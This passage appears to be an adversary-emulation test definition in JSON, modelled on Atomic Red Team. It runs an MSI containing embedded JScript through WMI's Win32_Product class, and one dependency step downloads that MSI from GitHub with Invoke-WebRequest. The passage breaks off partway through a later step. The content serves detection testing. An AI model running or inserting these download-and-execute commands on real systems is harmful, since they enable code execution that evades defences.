{
  "id": "882082f0-27c6-4eec-a43c-9aa80bccdb30",
  "name": "WMI Win32_Product Class - Execute Local MSI file with embedded JScript",
  "description": "Executes an MSI containing embedded JScript code using the WMI Win32_Product class\n",
  "platforms": [
    "windows"
  ],
  "steps": [
    {
      "id": "b35501c8-9652-409c-8ac0-aa1948060bdc",
      "type": "execute-command",
      "data": {
        "command": "Invoke-CimMethod -ClassName Win32_Product -MethodName #{action} -Arguments @{ PackageLocation = '#{msi_payload}' }\n",
        "command_type": "powershell"
      },
      "elevation_required": false
    },
    {
      "id": "4ef109de-410f-48cb-9e49-89d191301162",
      "name": "Check dependency 1/1",
      "description": "The MSI file must exist on disk at specified location (#{msi_payload})\n",
      "type": "execute-command",
      "data": {
        "command": "if (Test-Path \"#{msi_payload}\") {exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "42cd2c51-bd5d-4b97-bdac-f65e6f82867e",
      "name": "Resolve dependency 1/1",
      "description": "The MSI file must exist on disk at specified location (#{msi_payload})\n",
      "type": "execute-command",
      "data": {
        "command": "New-Item -Type Directory (split-path \"#{msi_payload}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_JScript.msi\" -OutFile \"#{msi_payload}\"\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "08a88d15-a6ef-4d22-a3d9-c37ad4872217",
